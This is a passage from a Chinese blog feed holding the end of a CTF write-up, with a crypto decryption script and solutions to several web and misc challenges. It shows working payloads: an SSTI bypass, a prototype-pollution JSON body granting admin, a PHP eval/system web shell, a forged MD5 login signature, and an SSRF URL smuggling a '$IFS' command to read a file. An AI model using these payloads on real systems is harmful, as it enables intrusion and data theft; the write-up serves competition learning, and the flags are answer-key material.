number">27</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">]</span>q <span class="token operator">=</span> <span class="token number">127</span>n <span class="token operator">=</span> <span class="token number">3</span>N <span class="token operator">=</span> <span class="token number">15</span>  <span class="token comment"># Number of rows in P</span><span class="token comment"># Convert P to numpy array</span>P <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>P<span class="token punctuation">,</span> dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>int32<span class="token punctuation">)</span><span class="token comment"># Extract a_i and b_i from P</span>a_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>b_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> row <span class="token keyword">in</span> P<span class="token punctuation">:</span>    b_i <span class="token operator">=</span> row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    a_i <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span>row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>tolist<span class="token punctuation">(</span><span class="token punctuation">)</span>    a_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a_i<span class="token punctuation">)</span>    b_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b_i<span class="token punctuation">)</span><span class="token comment"># Using the previously found secret vector s = [1, 26, 24, 54]</span>s <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>int32<span class="token punctuation">)</span><span class="token comment"># Decrypt C to get the IV</span>M_bits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> c_row <span class="token keyword">in</span> C<span class="token punctuation">:</span>    c <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>c_row<span class="token punctuation">,</span> dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>int32<span class="token punctuation">)</span>    product <span class="token operator">=</span> np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>c<span class="token punctuation">,</span> s<span class="token punctuation">)</span> <span class="token operator">%</span> q    <span class="token keyword">if</span> product <span class="token operator">&gt;</span> q<span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">:</span>        product <span class="token operator">-=</span> q    M_bits<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0</span> <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>product<span class="token punctuation">)</span> <span class="token operator">&lt;</span> q<span class="token operator">//</span><span class="token number">4</span> <span class="token keyword">else</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># Convert bits to bytes (IV is first 16 bytes)</span>M_bytes <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span> M_bits<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">:</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>iv <span class="token operator">=</span> M_bytes<span class="token comment"># Provided AES key and encrypted data</span>key <span class="token operator">=</span> <span class="token string">b'\x8fj\x94\x98-\x1fd\xd5\x89\xbe\xa9*Tu\x90\xb7'</span>encrypted <span class="token operator">=</span> <span class="token string">b'\x9fT@\xbc\x82\x8esQ\x1e\xd8\x1d\xdb\x9b\xb4\xf8rU\xc8\xa0\xcb\xaf H\xa9.\x04\x1e\xd2\x92\x1f\x0fBja-\x965x\xa8@\xc9x\xf9\xaf\x87\xd1\xa5}\xfc\x1b\xe0#\xc3m\xc9\x8973\x1c\x1f\x13\x8f\xb2a\xae\xa9]\xb9\xc2\xe8\x83A\x80\x13g\xc9a\x1c&lt;\x8a\x9c&amp;\xd9\xbd\x06\xef\xba9\xb0\x03\x9f\x022\xc9\x13\x9a\xffXPG\xc6o\xc0\xeaV7)XG9L\x84N7U\xe3Wn0G\x8e\xd3\x04(\n\x08\xb9\x17\xe6\xf1\xaa\xb7\x8a@$\x16\x13\x06A\x00\xc9Z\xdf\x7fQ\xc9\x08\xb4\xf3P\xfcpe\xe2\xeb\x96\x0e(-\xde\x17\xd1\x01\x1c_\x82\x8b\x9fw\xc8\x86\xfbw\xb5\xf7\xd0\xc8\x1784\xe3?\x00\x0b.)\xb7\xbc\x8e{\xe0\xae\x8d$\x0f\x19\'\xb6\xee@d\x00\xd9\x84\x8c\x0e\xa3,\xc6a\xa3\xba*1\xfd&lt;\xfd\x18\xd6\x9e\x8c4\x8e#\xfd\xbd&amp;0R\xeddE,\xed\xb6\x1e\x00\x11\xa6K\xd3\x1dT\x8c5\x8e\x00\xea\x10\xe9\'u"B#\xa1#\xd8\xe3\xf5j\xbc\x94M\xda\xe3\xcb*\xf0W1\xa0\x80\x1d\xfc\xbfo\x01?(da\r\xb6\x86\xd0\x90\x88Z\xa1`B\x89\x89\x89\xb3v\xa5\xf0\xe0\x0c\x8e\xcc+P\xfc\xfd#\x83\xe9\x93\x96\n\xf2\xa5\xfb\xc3\xc5\xaa\x9e\x89\x93\xb6\xf5\xea\x8c%NY\xc3\x0eR\xfas\xa1\x13\xf2/*\xce\x8b_:_r\xeb\xbe\x0b\x8a\x8c\x97\x7f|m}\xae\xa9I\x95\xcc\xe7\x80\xa5yC4\x1f5\xa4P\xc5\xbf.\xf9V\xe8|\xbb\xc3\xcb\x98&amp;\'JB\x99\x94\xc0\r$\x0b\xbe48u\xeb\xca\xa1\xfbb\xd8_R\x97\x8e\xaeI\xfc\xc2\xb2\xd2#@\xec\x16\xf1\xd7eCQ\x1cO\x13\xca\xb5\xd3\x1a\xb1\xf1_D\x80\x06\xa5\xbe\xbev\xbd\xd6\xbb\x9a\xc9x\x9cf:\xcb&gt;\xa2\xe1\xcad\xde]aw\xa0\xdc\xb2\xb3{+\x85\x8d\x8b\xc5\rT\xcc\xd9X\xd5\x9b\r&lt;\x99m\xb8b6s\xbfp\x0eo~\xe9&amp;\xb2{\xbe\xee\x93\xd2N1\\\x94\x968IWO7\xcb\xb6e\x80\xf7\x9air\xb2~\x17\x1cF\x0f\x82T]RBX\xdex\x13\x85\xfa\xcd-\xce\xdc\xe4\xe5^\x99u\xb5\x01\xd0-\xc3C\xcd\xc4y6\xb7\x9d|L1\xe74\xf7\x8cH\xe9\xa9\xfav\n\xec;\xf2\xa2w\xfb\x13_b\r)z!\xa3\xc8\xa8\xc2\xd2\x10\x00\x11\x11\r\xb2&amp;\xfb\x04&amp;\x84"&gt;x6l[\x06n&gt;\xa0\xbe\x9c`\xa7\x9e\xe0\xfb\x85\x91\xc4,\xcf\xac\xe11@a\xed3@\xfd}\x8e\xfaTp\xcb7\xe7\xbf\xd4\xe0~b\xd9\xe0&lt;\xba\x81\xd4"e\xfc\x939|j#0H\x86\xf8\x0b\x03\xd2\xe8\xf5\xe55\xdc\xc8\x06\\\xb7)\xcc\x9b\'\xf12'</span><span class="token comment"># AES decryption</span>cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token operator">=</span>key<span class="token punctuation">,</span> iv<span class="token operator">=</span>iv<span class="token punctuation">,</span> mode<span class="token operator">=</span>AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    decrypted <span class="token operator">=</span> unpad<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token comment"># Attempt to decode as UTF-8, fallback to latin-1 if error</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Decrypted Flag (UTF-8):"</span><span class="token punctuation">,</span> decrypted<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> UnicodeDecodeError<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Decrypted Flag (Latin-1):"</span><span class="token punctuation">,</span> decrypted<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> ValueError <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Decryption Error:"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Decrypted Bytes (Hex):"</span><span class="token punctuation">,</span> decrypted<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Decrypted Flag <span class="token punctuation">(</span>Latin<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> ÊAUÒ¦<span class="token operator">+</span>ÏAs¢lag<span class="token punctuation">{</span><span class="token number">6</span>ef<span class="token number">2</span><span class="token number">5</span>d<span class="token number">1</span>e<span class="token operator">-</span>bb<span class="token number">7</span><span class="token number">6</span><span class="token operator">-</span><span class="token number">8</span>e<span class="token number">5</span><span class="token number">3</span><span class="token operator">-</span>dbc<span class="token number">4</span><span class="token operator">-</span><span class="token number">1</span>e<span class="token number">5</span><span class="token number">6</span><span class="token number">5</span><span class="token number">8</span><span class="token number">5</span>f<span class="token number">9</span>aa<span class="token number">9</span><span class="token punctuation">}</span>flag<span class="token punctuation">{</span>6ef25d1e<span class="token operator">-</span>bb76<span class="token operator">-</span><span class="token number">8e53</span><span class="token operator">-</span>dbc4<span class="token operator">-</span>1e56585f9aa9<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="001"><a href="#001" class="headerlink" title="001"></a>001</h3><p>一次最多发十张，分次发即可</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7a219fb5c376aa8a0af0dbf54d33e40c.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/9ec4e5913a979f925ea9b97fd3554662.png"></p><p>后面类似的题应该都能用大模型搞，但感觉把时间浪费在这个上面没意义，就没弄。</p><hr><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="nest-js"><a href="#nest-js" class="headerlink" title="nest_js"></a>nest_js</h3><p>用admin当用户名</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/59435f4119ebd248adaadd024646c80a.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/82877b6f1996ab68d8b4376bdb626159.png"></p><hr><h3 id="星愿信箱"><a href="#星愿信箱" class="headerlink" title="星愿信箱"></a>星愿信箱</h3><p>发现不可以<code>{{}}</code>，于是用<code>{%%}</code>。用globals不行就用config找。</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/6ec0061fdcd9d4b477d7901354401cde.png"></p><p>cat被ban就换tac</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/63206e47cc2b8b867164b92002906db6.png"></p><hr><h3 id="多重宇宙日记"><a href="#多重宇宙日记" class="headerlink" title="多重宇宙日记"></a>多重宇宙日记</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/bb52212de3e9756bf84a54f6d788f238.png"></p><p>于是原型链污染即可</p><pre class="line-numbers language-none"><code class="language-none">{"settings":{"theme":"qq","language":"qq","__proto__":{"isAdmin":true}}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/73557507619e7117b3b450b017172bfb.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/61b4ce199ac411746df0fd2b0440cf04.png"></p><hr><h3 id="easy-file"><a href="#easy-file" class="headerlink" title="easy_file"></a>easy_file</h3><p>试出来了密码是password(直觉）（因为第一道题密码就是这个），不过弱密码+base64编码后一样。</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ef702a25843a8d8da76de9170a247eb6.png"></p><p>文件上传处发现只有jpg和txt没被ban，还在上一个界面发现了一个<code>file</code>=&gt;文件包含。</p><p>过滤了一些内容，用短标签<code>&lt;?=@eval(system('ls'));?&gt;</code>即可</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/824903733df062d8b69351c53394cf88.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5f16b58a80c5b73787ef9f520b63e27e.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/b40915e935d1fa40629efc5e24a6fbaf.png"></p><hr><h3 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h3><p><img src="C:/Users/16256/AppData/Roaming/Typora/typora-user-images/image-20250525203253474.png" alt="image-20250525203253474"></p><p>在源代码处发现<code>api.js</code>点进去发现<code>/api/sys/urlcode.php?url=</code></p><p><code>lopin.php</code>处发现用户名是user，为了让它是admin，用md5加密后爆破。得到密码admin123（0192023a7bbd73250516f069df18b500,admin123）</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/fd51910d59cc78d40371a30c54b96bdb.png"></p><p>签名错误，又看见</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> loginBtn <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'loginBtn'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> passwordInput <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> errorTip <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'errorTip'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> rawUsername <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>      loginBtn<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> rawPassword <span class="token operator">=</span> passwordInput<span class="token punctuation">.</span>value<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>rawPassword<span class="token punctuation">)</span> <span class="token punctuation">{</span>        errorTip<span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token string">'请输入密码'</span><span class="token punctuation">;</span>        errorTip<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">'show'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        passwordInput<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">const</span> md5Username <span class="token operator">=</span> CryptoJS<span class="token punctuation">.</span><span class="token constant">MD5</span><span class="token punctuation">(</span>rawUsername<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">const</span> md5Password <span class="token operator">=</span> CryptoJS<span class="token punctuation">.</span><span class="token constant">MD5</span><span class="token punctuation">(</span>rawPassword<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> shortMd5User <span class="token operator">=</span> md5Username<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">const</span> shortMd5Pass <span class="token operator">=</span> md5Password<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> timestamp <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//五分钟</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>于是伪造即可。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">generate_signature</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 1. 生成MD5哈希并截断</span>    md5_user <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>username<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span>    md5_pass <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span>    <span class="token comment"># 2. 获取时间戳（毫秒级）</span>    timestamp <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># 3. 拼接签名要素</span>    secret <span class="token operator">=</span> <span class="token string">'easy_signin'</span>    sign_str <span class="token operator">=</span> md5_user <span class="token operator">+</span> md5_pass <span class="token operator">+</span> timestamp <span class="token operator">+</span> secret    <span class="token comment"># 4. 生成最终签名</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>sign_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>username <span class="token operator">=</span> <span class="token string">"admin"</span>password <span class="token operator">=</span> <span class="token string">"admin123"</span>signature <span class="token operator">=</span> generate_signature<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"生成的签名: </span><span class="token interpolation"><span class="token punctuation">{</span>signature<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"时间戳: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n需要发送的请求头："</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"X-Sign: </span><span class="token interpolation"><span class="token punctuation">{</span>signature<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token comment">#生成的签名: bc3505e975e889e744d08dcdced0bbec</span><span class="token comment">#时间戳: 1748158580860</span><span class="token comment">#需要发送的请求头：</span><span class="token comment">#X-Sign: bc3505e975e889e744d08dcdced0bbec</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/91735a68589ee2a2db0cdb8745335bc4.png"></p><p>登进去给到gift<code>/var/www/html/backup/8e0132966053d4bf8b2dbe4ede25502b.php</code></p><p>用<code>$IFS</code>代替被过滤了的空格，在上一级目录发现<code>327a6c4304ad5938eaf0efb6cc3e53dc.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/cb394a8a485e1859dbc4f1ca74316e87.png"></p><p>直接<code>http://node10.anna.nssctf.cn:25955/api/sys/urlcode.php?url=localhost/backup/8e0132966053d4bf8b2dbe4ede25502b.php</code>显示“看不见哦”。于是将最后的p改成*。（改成?也行）</p><p><code>http://node10.anna.nssctf.cn:25955/api/sys/urlcode.php?url=localhost/backup/8e0132966053d4bf8b2dbe4ede25502b.php?name=cat$IFS../327a6c4304ad5938eaf0efb6cc3e53dc.ph*</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0c7e42daa392039a0c4934608a420b85.png"></p><hr><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><p>##灵感菇🍄哩菇哩菇哩哇擦灵感菇灵感菇🍄</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/278f9d177fee9e8f8d4416cc89ebf2a3.png"></p><p><a href="https://github.com/ProbiusOfficial/Lingicrypt%E7%84%B6%E5%90%8E%E7%94%A8%E7%BD%91%E7%AB%99%E4%B8%8A%E7%9A%84%E6%96%B9%E6%B3%95%E7%85%A7%E5%81%9A%E5%8D%B3%E5%8F%AF">https://github.com/ProbiusOfficial/Lingicrypt然后用网站上的方法照做即可</a></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/31b802cdb29a6d5baaae332947496737.png"></p><hr><h3 id="像素中的航班"><a href="#像素中的航班" class="headerlink" title="像素中的航班"></a>像素中的航班</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/d2b184cd60a4e70f47814936cd3e1216.png"></p><p>已知是中国南方航空，航班号CZ开头。而且这场比赛是郑州轻工业大学出的，郑州又新郑国际机场比较出名，于是确定出发地。而长城杯决赛在福州，半决赛在西安，直觉告诉我是福州（因为搞个半决赛也太逊了）（bushi)。于是查郑州到福州的飞机。</p><p><a href="https://flights.ctrip.com/international/Schedule/CGO-FOC.html">https://flights.ctrip.com/international/Schedule/CGO-FOC.html</a></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/6cb90a7e1d7e52868ba3526c38a28050.png"></p><p>LitCTF{CZ8289}</p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>H&amp;Nctf</title>
      <link href="/2025/05/18/h-nctf/"/>
      <url>/2025/05/18/h-nctf/</url>
      
